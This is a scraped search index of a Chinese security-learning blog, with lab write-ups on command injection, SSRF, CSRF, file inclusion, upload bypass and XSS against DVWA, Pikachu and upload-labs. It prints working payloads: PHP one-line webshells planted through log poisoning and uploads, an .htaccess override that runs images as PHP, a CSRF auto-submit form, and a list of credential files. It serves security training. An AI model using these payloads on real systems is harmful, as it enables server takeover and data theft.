出现原因：因为应用系统从设计上需要给用户提供指定的远程命令操作的接口。比如常见的路由器、防火墙、入侵检测等设备的web管理界面上，一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。而如果设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而控制整个后台服务器。 例如：如今很多甲方企业的自动化运维平台，大量的系统操作会通过“自动化运维”平台进行操作，其中 往往会出现远程系统命令执行的漏洞。 ","date":"2023-03-10","objectID":"/posts/rce/rce/:2:1","tags":[],"title":"RCE","uri":"/posts/rce/rce/"},{"categories":[],"content":"2.2 远程代码执行 出现原因：因为需求设计，后台有时候会把用户的输入作为代码的一部分进行执行，也造成了远程代码 执行漏洞，不管是使用了代码执行的函数，还是使用了不安全的反序列化等等。 ","date":"2023-03-10","objectID":"/posts/rce/rce/:2:2","tags":[],"title":"RCE","uri":"/posts/rce/rce/"},{"categories":[],"content":"2.3 防御 如果需要给前端用户提供操作类的API接口，一定需要对接口的输入的内容进行严格的判断，比如实施 严格的白名单是一个好的方法。 ","date":"2023-03-10","objectID":"/posts/rce/rce/:2:3","tags":[],"title":"RCE","uri":"/posts/rce/rce/"},{"categories":[],"content":"三、DVWA漏洞演示 ","date":"2023-03-10","objectID":"/posts/rce/rce/:3:0","tags":[],"title":"RCE","uri":"/posts/rce/rce/"},{"categories":[],"content":"2.1 Low级别 dvwa的命令注入模块，提供了一个检测IP是否存活的功能。如：输入127.0.0.1 在此模块中，有以下常用逻辑运算操作可利用 A \u0026\u0026 B： 先执行A，如果成功，执行B； A || B： 先执行A，如果失败，执行B； A | B：管道符，先执行A后，将A的结果作为B的输入，打印的是B的结果； A \u0026 B： 先执行A，然后不管成功与否，执行B； 示例： 127.0.0.1 \u0026\u0026 ls false || ls 127.0.0.1 | ls 127.0.0.1 \u0026 ls 这里 \u0026 表示将任务至于后台执行，因为 ls 执行比较快，所以结果显示在前面 ","date":"2023-03-10","objectID":"/posts/rce/rce/:3:1","tags":[],"title":"RCE","uri":"/posts/rce/rce/"},{"categories":["SSRF"],"content":"(1) SSRF（file_get_content），获取ssrf.php的源码； ","date":"2023-03-10","objectID":"/posts/ssrf/ssrf/:0:0","tags":[],"title":"SSRF","uri":"/posts/ssrf/ssrf/"},{"categories":["SSRF"],"content":"一、实验环境 软件名称 版本 部署方式 IP Pikachu latest docker run -d -p 8080:80 –name pikachu area39/pikachu 172.31.5.7 ","date":"2023-03-10","objectID":"/posts/ssrf/ssrf/:1:0","tags":[],"title":"SSRF","uri":"/posts/ssrf/ssrf/"},{"categories":["SSRF"],"content":"二、漏洞简介 SSRF(Server-Side Request Forgery：服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统。 ","date":"2023-03-10","objectID":"/posts/ssrf/ssrf/:2:0","tags":[],"title":"SSRF","uri":"/posts/ssrf/ssrf/"},{"categories":["SSRF"],"content":"2.1 原理 SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。通过控制功能中的发起请求的服务来当作跳板攻击内网中其他服务。比如，通过控制前台的请求远程地址加载的响应，来让请求数据由远程的URL域名修改为请求本地、或者内网的IP地址及服务，来造成对内网系统的攻击。 ","date":"2023-03-10","objectID":"/posts/ssrf/ssrf/:2:1","tags":[],"title":"SSRF","uri":"/posts/ssrf/ssrf/"},{"categories":["SSRF"],"content":"2.2 危害 1、扫描内网开放服务 2、向内部任意主机的任意端口发送payload来攻击内网服务 3、DOS攻击（请求大文件，始终保持连接Keep-Alive Always） 4、攻击内网的web应用，例如直接SQL注入、XSS攻击等 5、利用file、gopher、dict协议读取本地文件、执行命令等 ","date":"2023-03-10","objectID":"/posts/ssrf/ssrf/:2:2","tags":[],"title":"SSRF","uri":"/posts/ssrf/ssrf/"},{"categories":["SSRF"],"content":"三、漏洞演示 ","date":"2023-03-10","objectID":"/posts/ssrf/ssrf/:3:0","tags":[],"title":"SSRF","uri":"/posts/ssrf/ssrf/"},{"categories":["SSRF"],"content":"3.1 SSRF（file_get_content） file_get_contents() 函数把整个文件读入一个字符串中，是用于将文件的内容读入到一个字符串中的首选方法。如果操作系统支持，还会使用内存映射技术来增强性能。 php://filter：是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。 php://filter 目标使用以下的参数作为它路径的一部分。 复合过滤链能够在一个路径上指定。详细使用 这些参数可以参考具体范例。 名称 描述 resource=\u003c要过滤的数 据流\u003e 这个参数是必须的。它指定了你要筛选过滤的数据流，即要读的文 件。 read=\u003c读链的筛选列表\u003e 该参数可选。可以设定一个或多个过滤器名称，以管道符（ | ）分 隔。 write=\u003c写链的筛选列表 \u003e 该参数可选。可以设定一个或多个过滤器名称，以管道符（ | ）分 隔。 \u003c；两个链的筛选列表\u003e 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于 读或写链。 file_get_contents里面带有php://filter 我们用这个就可以来读取php源码，所以我们来构造URL： http://172.31.5.7:8080/vul/ssrf/ssrf_fgc.php?file=php://filter/resource=ssrf.php 浏览器输入，成功在SSRF(file_get_content)页面读取到概述页面 上图中，ssrf.php文件被解析成了网页进行显示。如果需要读取源码，而不希望该文件内被解析，需要在read参数中加入 convert.base64-encode http://172.31.5.7:8080/vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert.base64- encode/resource=ssrf.php 成功拿到base64编码后的源码 使用解码工具（https://base64.us/ ）解码后得到源码 ","date":"2023-03-10","objectID":"/posts/ssrf/ssrf/:3:1","tags":[],"title":"SSRF","uri":"/posts/ssrf/ssrf/"},{"categories":["SSRF"],"content":"四、漏洞修复 1、设置URL白名单或者黑名单内网IP； 2、过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准； 3、禁用不需要的协议，仅仅允许http和https请求，可以防止类似于file:///,gopher://,ftp:// 等引起的问题。 ","date":"2023-03-10","objectID":"/posts/ssrf/ssrf/:4:0","tags":[],"title":"SSRF","uri":"/posts/ssrf/ssrf/"},{"categories":["CSRF"],"content":"（1）DVWA-High等级 （2）使用Burp生成CSRF利用POC ","date":"2023-03-09","objectID":"/posts/csrf/csrf/:0:0","tags":[],"title":"CSRF","uri":"/posts/csrf/csrf/"},{"categories":["CSRF"],"content":"一、实验环境 软件名称 版本 部署方式 IP pikachu latest docker run -d -p 8080:80 –name pikachu area39/pikachu 172.31.5.7 BurpSuite Professional v2 window安装 172.31.5.1 DVWA latest docker run -d –name dvwa -p 80:80 172.31.5.7 ","date":"2023-03-09","objectID":"/posts/csrf/csrf/:1:0","tags":[],"title":"CSRF","uri":"/posts/csrf/csrf/"},{"categories":["CSRF"],"content":"二、漏洞简介 ","date":"2023-03-09","objectID":"/posts/csrf/csrf/:2:0","tags":[],"title":"CSRF","uri":"/posts/csrf/csrf/"},{"categories":["CSRF"],"content":"2.1 原理 1.用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A； 2.在用户信息用过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送 请求到网站A； 3.用户未退出网站A之前，在同一浏览器中打开一个TAB页访问网站B； 4.网站B接受到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A； 5.浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A 发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求， 导致来自网站B的恶意代码被执行。 ","date":"2023-03-09","objectID":"/posts/csrf/csrf/:2:1","tags":[],"title":"CSRF","uri":"/posts/csrf/csrf/"},{"categories":["CSRF"],"content":"2.2 产生条件 **一个功能操作。**应用程序中存在攻击者有可能诱导用户的操作。这可能是特权操作（例如修改其他用户的权限）或对用户特定数据的任何操作（例如更改用户自己的邮箱、密码）。 **基于 Cookie 的会话处理。**执行该操作涉及发出一个或多个 HTTP 请求，并且应用程序仅依赖会话 cookie 来识别发出请求的用户。没有其他机制可用于跟踪会话或验证用户请求。 **没有不可预测的请求参数。**执行该操作的请求不包含攻击者无法确定或猜测其值的任何参数。例如，当用户更改密码时，如果攻击者需要知道现有密码的值，则该功能不会受到攻击，因为攻击者预先构造的恶意链接中无法提前预测并定义“现有密码”的值。 例如，假设一个应用程序包含一个允许用户更改其帐户上的电子邮件地址的功能。当用户执行此操作 时，他们会发出如下 HTTP 请求： POST /email/change HTTP/1.1 Host: vulnerable-website.com Content-Type: application/x-www-form-urlencoded Content-Length: 30 Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE email=test@test.com 这符合 CSRF 所需的条件： 攻击者对更改用户帐户上的电子邮件地址的操作很感兴趣。执行此操作后，攻击者通常能够触发密 码重置并完全控制用户的帐户。 应用程序使用会话 cookie 来识别发出请求的用户。没有其他令牌或机制来跟踪用户会话。 攻击者可以轻松确定执行操作所需的请求参数的值。 有了这些条件，攻击者就可以构建一个包含以下 HTML 的网页： \u003chtml\u003e \u003cbody\u003e \u003cform action=\"https://vulnerable-website.com/email/change\" method=\"POST\"\u003e \u003cinput type=\"hidden\" name=\"email\" value=\"test@test.com\" /\u003e \u003c/form\u003e \u003cscript\u003e document.forms[0].submit(); \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e 如果受害者用户访问攻击者的网页，将会发生以下情况： 攻击者的页面将触发对易受攻击的网站的 HTTP 请求。 如果用户登录到易受攻击的网站，他们的浏览器将自动在请求中包含他们的会话 cookie。 易受攻击的网站将以正常方式处理请求，将其视为由受害者用户发出，并更改其电子邮件地址 ","date":"2023-03-09","objectID":"/posts/csrf/csrf/:2:2","tags":[],"title":"CSRF","uri":"/posts/csrf/csrf/"},{"categories":["CSRF"],"content":"三、漏洞复现 ","date":"2023-03-09","objectID":"/posts/csrf/csrf/:3:0","tags":[],"title":"CSRF","uri":"/posts/csrf/csrf/"},{"categories":["CSRF"],"content":"3.1 DVWA high等级 High级别的代码增加了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的 token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有 token正确，才会处理客户端请求。 这个High安全等级主要是利用了DVWA的XSS漏洞和CSRF漏洞共同完成的，找到DVWA的XSS模块，通 过XSS漏洞获取浏览器Cookie （临时调整安全级别为Low） 在输入框提交以下代码获取用户cookie: PHPSESSID=o5vb99b2blvbnhotnt0jb4gpe6; security=low \u003cscript\u003ealert(document.cookie)\u003c/script\u003e 将安全级别调整为High，然后抓包 删除token，并将security修改为low，PHPSESSION替换为上文获取的cookie值，然后Forward DVWA显示密码修改成功 ","date":"2023-03-09","objectID":"/posts/csrf/csrf/:3:1","tags":[],"title":"CSRF","uri":"/posts/csrf/csrf/"},{"categories":["CSRF"],"content":"3.2 CSRF(get) Pikachu 演示 打开并登录pikachu的CSRF(get) 模块 启用burp抓包，并修改个人信息：将邮箱修改为 test@test.com，然后提交 查看抓包结果 复制请求行信息 GET /vul/csrf/csrfget/csrf_get_edit.php?sex=\u0026phonenum=\u0026add=\u0026email=test%40test.com\u0026submit=submit HTTP/1.1 将需要修改的信息（黑客），如电话号码和地址等信息写到URL里 GET /vul/csrf/csrfget/csrf_get_edit.php?sex=666\u0026phonenum=777\u0026add=888\u0026email=test%40test.com\u0026submit=submit HTTP/1.1 然后添加补全URL地址，发送给被攻击者kobe（在另一个浏览器登录kobe账号） http://172.31.5.7:8080/vul/csrf/csrfget/csrf_get.php?sex=666\u0026phonenum=777\u0026add=888\u0026email=test%40test.com\u0026submit=submit 如果被攻击者kobe此时登录状态或cookie/session没有过期，则他的信息被修改，如下图： ","date":"2023-03-09","objectID":"/posts/csrf/csrf/:3:2","tags":[],"title":"CSRF","uri":"/posts/csrf/csrf/"},{"categories":["CSRF"],"content":"3.3 使用Burp生成CSRF利用POC 在 Burp Suite Professional 中的任意位置选择需要测试或利用的请求。 从右键单击上下文菜单中，选择参与工具/生成 CSRF PoC。 Burp Suite 将生成一些 HTML 来触发选定的请求（减去 cookie，它将由受害者的浏览器自动添加）。 可以调整 CSRF PoC 生成器中的各种选项，以微调攻击的各个方面。可能需要在一些不寻常的情况下执行此操作以处理请求的古怪功能。 将生成的 HTML 复制到网页中，在登录到易受攻击网站的浏览器中查看，并测试是否成功发出了预期的请求以及是否发生了所需的操作。 示例： 开启抓包，打开pikachu (CSRF post) 模块提交任意信息 打开burp的poc生成工具 获取到poc代码 document.forms[0].submit(); （1）这句话的意思是将表单提交到服务器去。 （2）没有他的话就不能向服务器提交数据了，那么就不能将你在页面中填写的数据反馈给服务器。表现为你在页面中点击“提交”按钮没有反应 （3）把你填写的数据提交到form中action指定的页面，如果action没词儿东西，就默认为当前页面 （4）如果你的提交按钮的type是submit的话，那么你可以不写这句话 原文链接：https://blog.csdn.net/qq_45760909/article/details/109037611 点击Test in browser，生成链接地址 新建标签页，复制链接到浏览器打开（确保burp代理是开启状态） 点击提交后，发现信息被修改。说明poc生成成功 打开另一浏览器使用vince账号登录（模拟用户点击恶意链接） 将上文获得的poc文件复制（点机Copy HTML即可），另存为恶意链接.html 将该文件拖入到浏览器中，点击提交按钮。发现信息被修改 ","date":"2023-03-09","objectID":"/posts/csrf/csrf/:3:3","tags":[],"title":"CSRF","uri":"/posts/csrf/csrf/"},{"categories":["File_Inclusion"],"content":"（1）DVWA环境下去包含其他目录的任意3个文件，要求使用相对路径 （2）远程文件包含 （3）中间件日志包含绕过，要求使用蚁剑连接成功 ","date":"2023-03-08","objectID":"/posts/file_inclusion/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/:0:0","tags":[],"title":"文件包含","uri":"/posts/file_inclusion/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"categories":["File_Inclusion"],"content":"一、实验环境 软件名称 部署方式 版本 IP DVWA docker run -d –name dvwa -p 80:80 latest 172.31.5.7 Upload-labs docker run -d -p 8081:80 –name upload-labs cuer/upload-labs latest 172.31.5.7 ","date":"2023-03-08","objectID":"/posts/file_inclusion/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/:1:0","tags":[],"title":"文件包含","uri":"/posts/file_inclusion/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"categories":["File_Inclusion"],"content":"二、漏洞简介 ","date":"2023-03-08","objectID":"/posts/file_inclusion/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/:2:0","tags":[],"title":"文件包含","uri":"/posts/file_inclusion/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"categories":["File_Inclusion"],"content":"2.1 原理 程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这种文件调用的过程一般被称为文件包含。程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。 在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件， 导致意外的文件泄露甚至恶意的代码注入。 ","date":"2023-03-08","objectID":"/posts/file_inclusion/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/:2:1","tags":[],"title":"文件包含","uri":"/posts/file_inclusion/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"categories":["File_Inclusion"],"content":"2.2 分类 文件包含漏洞一般可分为两类 **本地文件包含：**包含的是web服务器本地的文件，如：/etc/passwd等敏感文件 利用条件： 用户对输入可控且无过滤 **远程文件包含：**包含的是远程服务器（如黑客攻击机器上的文件），攻击者可通过此方式执行恶意代码 利用条件： 需要php.ini开启了allow_url_fopen和allow_url_include的配置。包含的文件是第三方服务器（比如： 攻击者搭建的一个Web服务器）的文件。 allow_url_fopen=On (默认为On) 规定是否允许从远程服务器或者网站检索数据 allow_url_include=On (php5.2之后默认为Off) 规定是否允许include/require远程文件 ","date":"2023-03-08","objectID":"/posts/file_inclusion/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/:2:2","tags":[],"title":"文件包含","uri":"/posts/file_inclusion/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"categories":["File_Inclusion"],"content":"2.3 相关函数 PHP中的文件包含函数有以下四种： require() include() require_once() include_once() include和require区别主要是，include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常 运行；而require函数出现错误的时候，会直接报错并退出程序的执行。 而include_once()，require_once()这两个函数，与前两个的不同之处在于这两个函数只包含一次。适 用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，想确保它只被包括一次以避免函数重 定义，变量重新赋值等问题。 ","date":"2023-03-08","objectID":"/posts/file_inclusion/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/:2:3","tags":[],"title":"文件包含","uri":"/posts/file_inclusion/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"categories":["File_Inclusion"],"content":"2.3 漏洞场景 URL中如果出现了如下内容就可能存在文件包含漏洞 ?page= ?file= ?home= 常见的系统敏感文件 windows系统 c:\\boot.ini // 查看系统版本 c:\\windows\\system32\\inetsrc\\MetaBase.xml //IIS配置文件 c:\\windows\\repair\\sam //存储windows系统初次安装的密码 c:\\programFiles\\mysql\\my.ini //MYSQL root密码 c:\\windows\\php.ini // php 配置信息 Linux系统 /etc/passwd // 账户信息 /etc/shadow // 账户密码文件 /usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件 /usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置 /usr/local/app/php5/lib/php.ini // PHP相关配置 /etc/httpd/conf/httpd.conf // Apache配置文件 /etc/my.conf // mysql 配置文件 ","date":"2023-03-08","objectID":"/posts/file_inclusion/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/:2:4","tags":[],"title":"文件包含","uri":"/posts/file_inclusion/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"categories":["File_Inclusion"],"content":"2.4 漏洞发现 1、观察URL链接是否包括以下类似的关键字：page/include/path/file/link/url等，如果有，则可能 存在文件包含漏洞； 2、可以观察在URL中，出现的赋值参数等号后跟的信息，是否为一个文件，如果是，则可能存在文件 包含漏洞； 3、在关键字处或明显被文件赋值的参数处，尝试进行赋值，如：https://www.baidu.com；或系统常 见文件，如：/etc/passwd（Linux） ","date":"2023-03-08","objectID":"/posts/file_inclusion/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/:2:5","tags":[],"title":"文件包含","uri":"/posts/file_inclusion/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"categories":["File_Inclusion"],"content":"三、漏洞复现 ","date":"2023-03-08","objectID":"/posts/file_inclusion/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/:3:0","tags":[],"title":"文件包含","uri":"/posts/file_inclusion/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"categories":["File_Inclusion"],"content":"3.1 本地文件包含 DVWA安全等级：Low, 文件包含模块可以看到有三个文件，且有关键字page 点击任意文件观察到URL中page字段的参数值有变化 查看源码分析：该页面使用get方法传递参数，且没有任何过滤 \u003c?php // The page we wish to display $file = $_GET[ 'page' ]; ?\u003e 尝试直接修改URL中page字段的参数值，输入多个 ../ 确保回到 / 目录下。可以读取到/etc/passwd 文件 尝试读取其它文件 ","date":"2023-03-08","objectID":"/posts/file_inclusion/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/:3:1","tags":[],"title":"文件包含","uri":"/posts/file_inclusion/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"categories":["File_Inclusion"],"content":"3.2 远程文件包含 还是在DVWA的文件包含模块，调整安全级别为：Low 远程文件使用upload-labs中的phpinfo.txt（需自行创建或者上传） root@09fcc517488e:/var/www/html# cat \u003e phpinfo.txt \u003c\u003cEOF \u003e \u003c?php \u003e \u003e phpinfo(); \u003e \u003e ?\u003e \u003e EOF root@09fcc517488e:/var/www/html# cat phpinfo.txt \u003c?php phpinfo(); ?\u003e page参数改为远程服务器的文件地址；**此处注意包含的远程文件不能为.php文件，否则将直接返回远程文件。正确的做法是，包含一个如：.txt后缀的文件，使得被攻击机器读取并执行其中的代码。 ** ","date":"2023-03-08","objectID":"/posts/file_inclusion/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/:3:2","tags":[],"title":"文件包含","uri":"/posts/file_inclusion/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"categories":["File_Inclusion"],"content":"3.3 中间件日志包含 DVWA安全等级：Low DVWA中，apache2日志文件路径为： /var/log/apache2/access.log 包含日志文件，需要先对文件和目录添加权限，让web端有权限去访问： [root@centos7 ~]# docker exec -it dvwa bash root@81bfa8dbf381:/# chmod 755 /var/log/apache2/ root@81bfa8dbf381:/# chmod 644 /var/log/apache2/access.log 修改完权限后，开启burp抓包，然后访问URL http://172.31.5.7/vulnerabilities/fi/?page=\u003c?php eval(@$_POST['a']);?\u003e 在burp中可以看到，URL被重新编码了 查看日志文件验证，日志文件记录的是URL编码后的一句话木马，是不能成功执行的 因此需要在burp中将URL改为正常的URL，然后Forward 再次查看日志验证结果，发现一句话木马被成功记录到日志 使用蚁剑链接，注意要配置Cookie（DVWA需要登录） 一句话木马利用成功 ","date":"2023-03-08","objectID":"/posts/file_inclusion/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/:3:3","tags":[],"title":"文件包含","uri":"/posts/file_inclusion/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"categories":["File_Upload"],"content":"（1）客户端绕过练习 （2）服务端黑名单绕过：给出.htaccess文件绕过的具体步骤 ","date":"2023-03-03","objectID":"/posts/file_upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/:0:0","tags":[],"title":"文件上传绕过","uri":"/posts/file_upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/"},{"categories":["File_Upload"],"content":"一、实验环境 软件名称 版本 部署方式 IP upload-labs latest docker run -d -p 8081:80 –name upload-labs cuer/upload-labs 172.31.5.7 ","date":"2023-03-03","objectID":"/posts/file_upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/:1:0","tags":[],"title":"文件上传绕过","uri":"/posts/file_upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/"},{"categories":["File_Upload"],"content":"二、客户端绕过 ","date":"2023-03-03","objectID":"/posts/file_upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/:2:0","tags":[],"title":"文件上传绕过","uri":"/posts/file_upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/"},{"categories":["File_Upload"],"content":"2.1 源码分析 浏览器访问 http://172.31.5.7:8081/Pass-01，选择Pass-01 直接上传php后缀的文件a.php会被拒绝 点击右上角显示源码： 分析源码可知，此文件上传类型是通过前端js进行限制，因此可通过禁用浏览器的js来绕过 ","date":"2023-03-03","objectID":"/posts/file_upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/:2:1","tags":[],"title":"文件上传绕过","uri":"/posts/file_upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/"},{"categories":["File_Upload"],"content":"2.2 禁用浏览器js google浏览器：设置——隐私与安全性——网站设置——JavaScript——不允许网站使用JavaScript（也可通过添加白名单的方式，不影响浏览器正常使用） ","date":"2023-03-03","objectID":"/posts/file_upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/:2:2","tags":[],"title":"文件上传绕过","uri":"/posts/file_upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/"},{"categories":["File_Upload"],"content":"2.3 上传木马 准备一句话木马文件a.php，内容： \u003c?php eval(@$_GET['a']);?\u003e 刷新后，再次上传a.php文件成功 右键上传的文件获取图片地址：http://172.31.5.7:8081/upload/a.php 浏览器访问 http://172.31.5.7:8081/upload/a.php?a=phpinfo(); 成功植入一句话木马: ","date":"2023-03-03","objectID":"/posts/file_upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/:2:3","tags":[],"title":"文件上传绕过","uri":"/posts/file_upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/"},{"categories":["File_Upload"],"content":"2.2 蚁剑连接 重新上传一句话木马shell.php，内容： \u003c?php eval(@$_POST['passwd']);?\u003e 使用蚁剑连接一句话木马（密码为一句话木马内容中的参数passwd） ","date":"2023-03-03","objectID":"/posts/file_upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/:2:4","tags":[],"title":"文件上传绕过","uri":"/posts/file_upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/"},{"categories":["File_Upload"],"content":"三、htaccess文件绕过 ","date":"2023-03-03","objectID":"/posts/file_upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/:3:0","tags":[],"title":"文件上传绕过","uri":"/posts/file_upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/"},{"categories":["File_Upload"],"content":"3.1 漏洞原理 htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现： 网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。上传.htaccess文件，来绕过黑名单。 前提条件 1.mod_rewrite模块开启。 2.AllowOverride All Upload-labs（Pass-04）源码分析，这个比03增加了黑名单量。但是，中间件为Apache的情况下，黑 名单未校验htaccess文件，导致可上传htaccess文件，绕过黑名单检测。 源码如下： 由于.htaccess还是没有过滤，可以重写文件解析规则绕过，上传一个 .htaccess。文件中配置可使得当前目录所有文件都使用PHP解析，那么无论上传任何文件，只要文件内容符合PHP语言代码规范，就会被当作PHP执行。 我们需要先准备好两个文件（ .htaccess 和 test.jpg）注意：.htaccess文件名就是 .htaccess ，不能修改为其它名称。该文件在windows如果不能直接修改名称，可打开记事本编辑后，选择另存为（保存类型：所有类型）即可生成。或者参考网上其它方式 .htaccess: \u003cFilesMatch \"test.jpg\"\u003e Sethandler application/x-httpd-php \u003c/FilesMatch\u003e \u003cIfModule mime_module\u003e SetHandler application/x-httpd-php \u003c/IfModule\u003e test.jpg \u003c?php @eval($_POST[\"passwd\"]);?\u003e ","date":"2023-03-03","objectID":"/posts/file_upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/:3:1","tags":[],"title":"文件上传绕过","uri":"/posts/file_upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/"},{"categories":["File_Upload"],"content":"3.2 开始绕过 3.2.1 上传.htaccess 3.2.2 上传test.jpg 3.2.3 使用蚁剑进行连接 ","date":"2023-03-03","objectID":"/posts/file_upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/:3:2","tags":[],"title":"文件上传绕过","uri":"/posts/file_upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/"},{"categories":["XSS"],"content":"（1）使用pikachu平台练习XSS键盘记录、前台XSS盲打攻击获取cookie （2）使用beef进行钓鱼，获取用户cookie ","date":"2023-02-25","objectID":"/posts/xss/%E5%88%A9%E7%94%A8xss%E6%BC%8F%E6%B4%9E%E8%8E%B7%E5%8F%96cookie/:0:0","tags":[],"title":"利用XSS漏洞获取cookie","uri":"/posts/xss/%E5%88%A9%E7%94%A8xss%E6%BC%8F%E6%B4%9E%E8%8E%B7%E5%8F%96cookie/"},{"categories":["XSS"],"content":"一、实验环境 软件名 版本 部署方式 IP地址 BeEF latest 安装命令：sudo apt install -y beef-xss 172.31.5.9 Pikachu Version 1.10 Development (Release date: 2015-10-08) 安装命令：docker run -d -p 80:80 –name pikachu area39/pikachu 172.31.5.7 ","date":"2023-02-25","objectID":"/posts/xss/%E5%88%A9%E7%94%A8xss%E6%BC%8F%E6%B4%9E%E8%8E%B7%E5%8F%96cookie/:1:0","tags":[],"title":"利用XSS漏洞获取cookie","uri":"/posts/xss/%E5%88%A9%E7%94%A8xss%E6%BC%8F%E6%B4%9E%E8%8E%B7%E5%8F%96cookie/"},{"categories":["XSS"],"content":"二、实验开始 ","date":"2023-02-25","objectID":"/posts/xss/%E5%88%A9%E7%94%A8xss%E6%BC%8F%E6%B4%9E%E8%8E%B7%E5%8F%96cookie/:2:0","tags":[],"title":"利用XSS漏洞获取cookie","uri":"/posts/xss/%E5%88%A9%E7%94%A8xss%E6%BC%8F%E6%B4%9E%E8%8E%B7%E5%8F%96cookie/"},{"categories":["XSS"],"content":"2.1 XSS 盲打 XSS盲打是一种攻击场景，也是属于存储型XSS类型。 盲打的意思是无法直接在前端看到反馈效果，只有后台能看到输入的内容，从前端无法判断是否存在 XSS，这种情况下，我们直接往里面插入XSS代码，然后等待，当管理员查看时就会遭到xss攻击。 